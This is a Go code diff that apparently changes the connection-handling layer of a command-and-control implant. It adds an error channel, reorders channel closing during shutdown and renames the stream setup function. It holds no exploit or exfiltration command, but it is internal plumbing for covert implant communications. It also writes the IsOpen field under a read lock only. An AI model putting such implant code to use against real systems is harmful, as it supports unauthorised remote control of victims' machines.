@@ -53,24 +53,27 @@ type Connection struct {
 	stream  io.ReadWriteCloser // Might be empty
 
 	// Closing details
-	Cleanup func() error    // User can pass this when instantiating a connection
-	wg      *sync.WaitGroup // Ensure cleanup not triggered while envelopes to write.
-	once    *sync.Once      // Ensure cleanup is done only once
-	mutex   *sync.RWMutex
+	ErrClosed chan error      // The owner of this connection might want to monitor for its errors
+	errClosed error           // The actual error that caused the closing
+	Cleanup   func() error    // User can pass this when instantiating a connection
+	wg        *sync.WaitGroup // Ensure cleanup not triggered while envelopes to write.
+	once      *sync.Once      // Ensure cleanup is done only once
+	mutex     *sync.RWMutex
 }
 
 // NewConnection - Create new logical connection that receives
 // and sends envelopes through an underlying C2 connection.
 func NewConnection() *Connection {
 	connection := &Connection{
-		Send:    make(chan *pb.Envelope),
-		Recv:    make(chan *pb.Envelope),
-		IsOpen:  true,
-		Done:    make(chan bool, 1),
-		tunnels: &map[uint64]*Tunnel{},
-		once:    &sync.Once{},
-		mutex:   &sync.RWMutex{},
-		wg:      &sync.WaitGroup{},
+		Send:      make(chan *pb.Envelope),
+		Recv:      make(chan *pb.Envelope),
+		IsOpen:    true,
+		Done:      make(chan bool, 1),
+		tunnels:   &map[uint64]*Tunnel{},
+		once:      &sync.Once{},
+		mutex:     &sync.RWMutex{},
+		wg:        &sync.WaitGroup{},
+		ErrClosed: make(chan error, 1), // Just in case the caller has not assigned
 	}
 
 	return connection
@@ -88,15 +91,13 @@ func (c *Connection) Close() (err error) {
 		// {{if .Config.Debug}}
 		log.Printf("Closing implant connection \n")
 		// {{end}}
+		c.mutex.RLock()
+		c.IsOpen = false
+		c.mutex.RUnlock()
 
 		// This might help components to notice its time
 		// to stop using us, a little ahead of time just in case.
 		c.Done <- true
-
-		// Close the envelopes channels
-		// Don't always close Send, because some protocols
-		// in some cases might leave room to keep writing.
-		close(c.Recv)
 
 		// When there is an underlying stream, close
 		if c.stream != nil {
@@ -107,7 +108,18 @@ func (c *Connection) Close() (err error) {
 		if c.Cleanup != nil {
 			err = c.Cleanup()
 		}
-		c.IsOpen = false
+
+		// Close the envelopes channels
+		// Don't always close Send, because some protocols
+		// in some cases might leave room to keep writing.
+		close(c.Recv)
+
+		// If we were closed because of an internal error (not the user wish),
+		// notify the caller (and block until acknowledged) that we are closed
+		// and we have cleaned up our stuff.
+		if c.errClosed != nil {
+			c.ErrClosed <- c.errClosed
+		}
 	})
 	return
 }
@@ -170,12 +182,10 @@ func (c *Connection) RequestRecv() chan *pb.Envelope {
 	return c.Recv
 }
 
-// SetupConnectionStream - Create a primitive ReadWriteCloser on our goroutines (to rule them all)
-func SetupConnectionStream(stream io.ReadWriteCloser, userCleanup func() error) (*Connection, error) {
-
-	connection := NewConnection()
+// NewSession - Create a primitive ReadWriteCloser on our goroutines (to rule them all)
+func NewSession(stream io.ReadWriteCloser, connection *Connection) error {
+	// We need a few clean fields
 	connection.stream = stream
-	connection.Cleanup = userCleanup
 
 	go func() {
 		defer connection.Close()
@@ -188,7 +198,7 @@ func SetupConnectionStream(stream io.ReadWriteCloser, userCleanup func() error) 
 				// {{if .Config.Debug}}
 				log.Printf("[TLV] send loop envelope type %d\n", envelope.Type)
 				// {{end}}
-				streamWriteEnvelope(stream, envelope)
+				connection.errClosed = streamWriteEnvelope(stream, envelope)
 
 				// This envelope is either written, or lost.
 				// In any case we are not responsible for it.
@@ -206,8 +216,9 @@ func SetupConnectionStream(stream io.ReadWriteCloser, userCleanup func() error) 
 				break RECV
 			default:
 				envelope, err := streamReadEnvelope(stream)
+				connection.errClosed = err // Assign the error in case its not nil.
 				if err == io.EOF {
-					break
+					break RECV
 				}
 				if err == net.ErrClosed {
 					break RECV
@@ -227,7 +238,7 @@ func SetupConnectionStream(stream io.ReadWriteCloser, userCleanup func() error) 
 		}
 	}()
 
-	return connection, nil
+	return nil
 }
 
 const (
